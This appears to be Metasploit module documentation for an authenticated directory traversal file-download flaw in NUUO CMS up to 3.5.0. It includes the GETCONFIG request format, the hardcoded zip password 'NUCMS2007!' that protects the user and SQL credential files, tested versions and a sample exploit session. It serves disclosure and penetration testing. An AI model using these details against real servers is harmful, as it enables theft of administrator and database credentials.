## Vulnerable Application

Nuuo CMS Authenticated Arbitrary File Download

The GETCONFIG verb is used by a CMS client to obtain configuration files and other resources from the CMS server. An example request is below:

```
GETCONFIG NUCM/1.0
FileName: <filename>
FileType: <number>
User-Session-No: <session-number>
```

The FileType determines the directory where the file will be downloaded from. "FileType: 0" will download from the base installation directory (CMS_DIR), while "FileType: 1" will download from "<CMS_DIR>\Images\Map\". There are other defined FileType integers, but these have not been investigated in detail.

The vulnerability is in the "FileName" parameter, which accepts directory traversal (..\\..\\) characters. Therefore, this function can be abused to obtain any files off the file system, including:

- CMServer.cfg, a file zipped with the password "NUCMS2007!" that contains the usernames and passwords of all the system users (enabling a less privileged user to obtain the administrator's password)
- ServerConfig.cfg, another file zipped with the password "NUCMS2007!" that contains the SQL Server "sa" password as well the FTP server username and password
- Any other sensitive files in the drive where CMS Server is installed.

This module works in the following way:

- if a SESSION number is present, uses that to login
- if not, tries to authenticate with USERNAME and PASSWORD

Due to the lack of ZIP encryption support in Metasploit, the module prints a warning indicating that the archive cannot be unzipped in Msf.

[NUUO Central Management Server (CMS): all versions up to and including 3.5.0](http://d1.nuuo.com/NUUO/CMS/)

The following versions were tested:

 - 1.5.2 OK
 - 2.1.0 OK
 - 2.3.2 OK
 - 2.4.0 OK
 - 2.6.0 OK
 - 2.9.0 OK
 - 2.10.0 OK
 - 3.1 OK
 - 3.3 OK
 - 3.5 OK

## Scenarios

### Tested on Windows 10 Pro x64 running NCS Server 2.4.0

```
msf5 auxiliary(gather/nuuo_cms_file_download) > set rhosts 172.22.222.200
rhosts => 172.22.222.200
msf5 auxiliary(gather/nuuo_cms_file_download) > exploit

[+] 172.22.222.200:5180 - Downloaded file to /home/msfdev/.msf4/loot/20190219064923_default_172.22.222.200_CMServer.cfg_227185.cfg
[+] 172.22.222.200:5180 - Downloaded file to /home/msfdev/.msf4/loot/20190219064923_default_172.22.222.200_ServerConfig.cfg_050084.cfg
[*] 172.22.222.200:5180 - The user and server configuration files were stored in the loot database.
[*] 172.22.222.200:5180 - The files are ZIP encrypted, and due to the lack of the archive/zip gem,
[*] 172.22.222.200:5180 - they cannot be decrypted in Metasploit.
[*] 172.22.222.200:5180 - You will need to open them up with zip or a similar utility, and use the
[*] 172.22.222.200:5180 - password NUCMS2007! to unzip them.
[*] 172.22.222.200:5180 - Annoy the Metasploit developers until this gets fixed!
[*] Auxiliary module execution completed
msf5 auxiliary(gather/nuuo_cms_file_download) >
```
